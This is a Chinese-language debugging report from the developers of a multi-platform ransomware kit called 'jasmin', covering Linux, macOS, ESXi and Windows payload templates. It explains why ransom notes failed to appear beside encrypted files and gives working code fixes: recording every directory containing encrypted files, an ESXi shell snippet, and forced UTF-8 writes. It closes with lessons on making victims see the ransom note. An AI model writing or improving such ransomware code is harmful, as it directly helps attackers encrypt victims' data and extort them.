## 一、根因分析

### 1.1 直接原因：投放位置错了

四个平台的 `drop_notes` 都是**固定目录列表**，与"哪些目录真的被加密"完全无关：

```python
# linux_payload.tpl（修复前）

    txt=RANSOM_TXT.replace('{sid}',sid)
    for d in dirs:
        if not os.path.isdir(d):continue
        try:open(os.path.join(d,NOTE_NAME),'w').write(txt)
        except:pass
        for desk in ['Desktop','桌面']:
            ...
```
```python
# main()
note_dirs=roots+[os.path.expanduser('~')]        # ← 只有 6 个根目录顶层
...
drop_notes(note_dirs,sid)
```

实测（容器内跑真实载荷，加密文件在 `/tmp/rt/deep/nested/`）：

```
跑之后穷举全盘找 READ_ME:
  /home/READ_ME_解密教程.txt
  /opt/READ_ME_解密教程.txt
  /root/READ_ME_解密教程.txt
  /srv/READ_ME_解密教程.txt
  /tmp/READ_ME_解密教程.txt
  /var/READ_ME_解密教程.txt

/tmp/rt/ 目录内容（加密文件所在目录）:
  b.txt.jasmin          ← 加密了
  deep/nested/
    a.txt.jasmin        ← 加密了
                        ← 但整个 /tmp/rt 子树里没有任何 READ_ME
```

勒索信确实生成了，但**用户看加密文件的那个目录，里面没有**。这就是"运行完成没有生成勒索信"。

各平台的固定列表：

| 平台 | 修复前的投放位置 |
|---|---|
| Linux | `/home /root /var /opt /tmp /srv` 顶层 + `~` + `/home/<user>` |
| macOS | 仅 `roots` 顶层（连 `/home/<user>` 都没有） |
| ESXi | `/vmfs/volumes/*` 顶层 + `/tmp` |
| Windows | 桌面 / 文档 / 用户目录 + 各盘符根 |

ESXi 尤其明显：数据存储里往往有几十层目录（`/vmfs/volumes/ds1/VM名/`），勒索信只在 `/vmfs/volumes/ds1/` 顶层放一份，进到 VM 目录里什么都看不到。

### 1.2 隐藏原因：编码静默失败

```python
try:open(os.path.join(d,NOTE_NAME),'w').write(txt)
except:pass
```

`open(path,'w')` **未指定 `encoding`** → 使用 `locale.getpreferredencoding()`。在受害者机器上如果 locale 是 `C`/`POSIX`（服务器、精简系统、容器里极常见），该值为 `ANSI_X3.4-1968`（ASCII），写入含中文的勒索信内容会抛：

```
UnicodeEncodeError: 'ascii' codec can't encode characters in position 0-1
```

而 `except:pass` **把它整个吞掉**，脚本照常打印"加密完成"，勒索信一份都不生成，且**没有任何报错**。

> 本机 python 容器实测即使 `LC_ALL=C` 也是 utf-8（Python 3.7+ 的 locale coercion 生效），所以靠容器测不出来 —— 但 Python 3.6、或设置了 `PYTHONCOERCECLOCALE=0`、或嵌在别的宿主进程里时就会触发。属必须消除的健壮性缺陷。

### 1.3 顺带：标题重复

`build_ransom_note()` 把用户填的标题和硬编码的中文副标题都输出：

```php
$n.= "║  {$t}\n";                    // 用户标题
$n.= "║  你的文件已被加密\n";         // 硬编码副标题
```

标题填英文（默认 `YOUR FILES HAVE BEEN ENCRYPTED`）时形成"英文标题 + 中文副标题"，是设计意图；但标题一旦填成中文就出现两行相同内容。

## 二、修复内容

### 2.1 投放位置：加密到哪个目录，勒索信就落到哪个目录

统一思路：**加密过程中收集「含有被加密文件的目录」集合，结束后逐目录投放（去重）**，同时保留原有的根目录投放。

**Linux / macOS**

```python
hit_dirs=set()   # 记录含有被加密文件的目录 —— 勒索信必须投放到每一个
...
                    if ok:
                        stats['count']+=1;stats['size']+=sz
                        hit_dirs.add(dp)          # ← 新增
...
    note_dirs=set(roots);note_dirs.add(os.path.expanduser('~'))
    note_dirs|=hit_dirs      # 关键
    drop_notes(sorted(note_dirs),sid)
```

> 内存考量：`hit_dirs` 存的是**目录**而非文件路径，规模比文件数小 1~2 个数量级，与"预扫描 O(1)"的设计不冲突。

**ESXi（BusyBox sh）**

```sh
NOTE_DIRS="/tmp/.jnotedirs_$$"
: > "$NOTE_DIRS"
...

                    COUNT=$((COUNT+1)); SIZE=$((SIZE+FSIZE))
                    printf '%s\n' "${F%/*}" >> "$NOTE_DIRS"   # ${F%/*} = dirname，无需外部命令
...
drop_notes "$SID" "$NOTE_DIRS"
rm -f "$NOTE_DIRS"
```

### 2.2 编码：显式 UTF-8

```python
    # 必须显式 utf-8：受害者机器 locale 可能是 C/POSIX，
    # 默认编码写中文会抛 UnicodeEncodeError 并被 except 静默吞掉 -> 勒索信不生成
    written=0
    for d in dirs:
        if not os.path.isdir(d):continue
        try:
            with open(os.path.join(d,NOTE_NAME),'w',encoding='utf-8',errors='replace') as f:f.write(txt)
            written+=1
        except Exception:pass
        for desk in ['Desktop','桌面']:
            dp=os.path.join(d,desk)
            if os.path.isdir(dp):
                try:
                    with open(os.path.join(dp,NOTE_NAME),'w',encoding='utf-8',errors='replace') as f:f.write(txt)
                    written+=1
                except Exception:pass
    sys.stderr.write('[jasmin] 勒索信已投放 %d 处\n'%written)
```

同时把 `except:` 收窄为 `except Exception:`，并把成功计数打印出来 —— 原实现失败时完全无声，是问题长期没被发现的原因。四平台现在都会输出「勒索信已投放 N 处」。

## 五、经验

1. **`except:pass` 是事故的温床。** 编码错误被静默吞掉，脚本一路打印"完成"却什么都没做。凡是有"完成"输出的地方，都要有对应的**成功计数**。
2. **"跑完了"≠"做对了"。** 加密确实完成了（`.jasmin` 都在），但用户检查的是**勒索信**，两者投放策略不一致就形成"没生效"的观感。
3. **勒索软件的核心是让受害者看到勒索信。** 只投根目录等于没投 —— 用户日常活动在自己的子目录里。
4. 固定目录列表（桌面/文档/盘符根）只能覆盖"用户一定会看的地方"的一部分，必须叠加"加密触达的地方"。
